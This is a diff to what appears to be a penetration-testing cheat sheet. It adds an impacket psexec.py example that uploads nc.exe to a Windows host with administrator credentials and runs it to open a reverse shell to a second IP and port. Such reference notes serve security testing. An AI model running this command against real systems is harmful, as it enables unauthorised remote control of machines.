@@ -174,10 +174,15 @@ rpcclient $> lsaquery
 
 ### :open_file_folder: [Psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
 
-get interactive shell on the Windows host
+[Microsoft PsExec Tool](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
 
-```
+get interactive shell on the Windows host (ADMIN$ or C$ must be writeable)
+
+```shell
 psexec.py <domain>/<username>:'<password>'@<target ip>
+# example
+psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.exe 192.168.9.123 4444" -c ~/Documents/nc.exe
+# -c pathname copy the filename for later execution, arguments are passed in the command option
 ```
 
 ### :open_file_folder: Test Environment
